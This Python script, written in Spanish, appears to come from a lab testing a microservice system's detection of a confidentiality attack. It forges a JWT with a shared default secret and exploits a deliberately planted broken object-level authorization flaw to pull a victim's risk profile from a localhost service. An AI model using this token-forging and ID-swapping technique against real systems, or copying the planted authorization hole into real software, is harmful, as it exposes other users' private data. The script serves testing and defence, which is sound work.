"""Escenario 1 — Confidencialidad (ASR1).

Simula al atacante: forja un token de sesión (PyJWT, mismo `JWT_SECRET` que
`ms-identidad`) para pedirle a `ms-cliente` el perfil de riesgo de una
víctima. El token es válido (firma correcta, `customer_id` existente) pero
pertenece a otro cliente — `ms-identidad` no compara `customer_id` del token
contra el `customer_id` solicitado (BOLA deliberado, ver
`../ms-identidad/README.md`), así que la extracción no autorizada se
completa igual.
"""
import os
from datetime import datetime

import jwt
import requests

MS_CLIENTE_URL = os.getenv("MS_CLIENTE_URL", "http://localhost:6002")
PERFIL_PATH = "/perfil-riesgo"
JWT_SECRET = os.getenv("JWT_SECRET", "change-me")

ATACANTE = {
    "customer_id": os.getenv("ATACANTE_CUSTOMER_ID", "CLI-0002"),
    "ip": "1.2.3.4",  # dummy — simula origen desde un país sancionado
    "device": "unknown-device",
    "pais": "IR",
}


def forjar_token(customer_id_atacante: str) -> str:
    return jwt.encode({"customer_id": customer_id_atacante}, JWT_SECRET, algorithm="HS256")


def ejecutar_ataque(customer_id_victima: str):
    token = forjar_token(ATACANTE["customer_id"])
    ataque_enviado_en = datetime.now()
    body = {
        "token": token,
        "customer_id": customer_id_victima,
        "ip": ATACANTE["ip"],
        "device": ATACANTE["device"],
        "pais": ATACANTE["pais"],
    }

    respuesta = requests.post(f"{MS_CLIENTE_URL}{PERFIL_PATH}", json=body, timeout=10)

    print(f"Ataque enviado: {ataque_enviado_en.isoformat(timespec='seconds')}")
    print(
        f"Token forjado para customer_id_token={ATACANTE['customer_id']} "
        f"pidiendo customer_id_solicitado={customer_id_victima}"
    )

    try:
        payload = respuesta.json()
    except ValueError:
        payload = respuesta.text

    extraccion_exitosa = respuesta.status_code == 200 and bool(payload)
    print(f"HTTP status: {respuesta.status_code}")
    print(f"Extraccion exitosa: {'si' if extraccion_exitosa else 'no'}")
    if extraccion_exitosa:
        print(f"Datos extraidos: {payload}")

    print(
        "Evidencia: GET "
        f"http://localhost:6004/incidentes (ms-audit) o "
        "'docker compose logs -f ms-audit ms-notificaciones' para el "
        "tiempo de deteccion (ASR1, <200ms) y de notificacion (ASR3, <5s)."
    )


if __name__ == "__main__":
    ejecutar_ataque(customer_id_victima=os.getenv("VICTIMA_CUSTOMER_ID", "CLI-0001"))
